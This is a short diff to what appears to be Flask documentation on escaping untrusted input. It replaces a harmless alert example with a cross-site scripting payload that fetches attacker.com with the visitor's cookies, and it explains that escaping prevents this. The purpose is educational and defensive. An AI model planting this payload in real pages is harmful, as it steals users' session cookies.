@@ -147,8 +147,10 @@ how you're using untrusted data.
         name = request.args.get("name", "Flask")
         return f"Hello, {escape(name)}!"
 
-If a user submits ``/hello?name=<script>alert("bad")</script>``, escaping causes
-it to be rendered as text, rather than running the script in the user's browser.
+For example, if a web app displays user reviews without escaping input, an attacker could submit
+``<script>fetch('https://attacker.com?cookie=' + document.cookie);</script>``. 
+Now, any user viewing that page would unknowingly send their cookies to the attacker. 
+This is a classic Cross-Site Scripting (XSS) attack, preventable by escaping or encoding user input before rendering.
 
 
 Routing
